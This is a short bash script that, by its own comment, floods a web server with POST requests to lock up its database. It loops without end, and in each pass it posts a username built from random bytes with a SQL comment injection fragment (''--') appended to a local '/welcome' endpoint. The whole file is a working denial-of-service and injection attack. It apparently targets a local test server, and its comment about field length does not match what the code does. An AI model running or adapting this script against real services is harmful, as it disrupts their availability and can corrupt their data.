#!/bin/bash

# Script to flood webserver with POST requests and locking up the db by creating many users

# Increment counter
counter=0

while :
do
    # Generate a random username 1 byte over max length of SQL text field
    username="$(head -76 /dev/urandom)"
    username+="'--"
    echo "On iteration $counter"
    curl -X POST http://localhost:15000/welcome -d "username=$username&password=1234";
    counter=$((counter+1))
done